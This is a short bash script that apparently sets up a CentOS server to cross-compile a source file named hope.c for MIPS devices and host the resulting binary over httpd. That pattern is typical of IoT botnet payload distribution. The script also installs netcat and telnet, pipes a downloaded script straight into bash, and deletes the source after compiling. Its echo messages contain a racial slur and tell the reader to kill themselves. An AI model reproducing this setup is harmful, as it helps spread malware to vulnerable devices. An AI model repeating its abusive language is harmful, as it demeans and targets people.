#!/bin/bash
echo " ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ "
echo "▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌"
echo "▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ "
echo "▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌          " 
echo "▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ "
echo "▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌"
echo "▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀█░█▀▀      ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌"
echo "▐░▌       ▐░▌▐░▌     ▐░▌       ▐░▌     ▐░▌                    ▐░▌"
echo "▐░▌       ▐░▌▐░▌      ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌"
echo "▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌"
echo " ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ "
echo "PROCESS IS STARTING DON'T QUIT!"  
sleep 3                                                                                                                               
yum update -y; yum upgrade -y; yum install grep -y; yum install epel-release -y; yum install gcc-c++ -y; yum install nodejs -y; yum install screen -y; yum install httpd -y; yum install telnet -y; yum install gcc -y; yum install nano -y; yum install unzip -y; yum install nc -y;
echo ''
echo 'Done installing shit, you lazy nigger!'
sleep 3
curl --silent --location https://rpm.nodesource.com/setup | bash -
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 && tar -vxjf cross-compiler-mips.tar.bz2 
mv hope.c /root/cross-compiler-mips/bin
cd cross-compiler-mips ; cd bin ; ls
./mips-gcc -o mips hope.c ; rm -rf hope.c ; mv mips /var/www/html
service httpd start
cd /var/www/html
sleep 3
echo 'There its done now kys'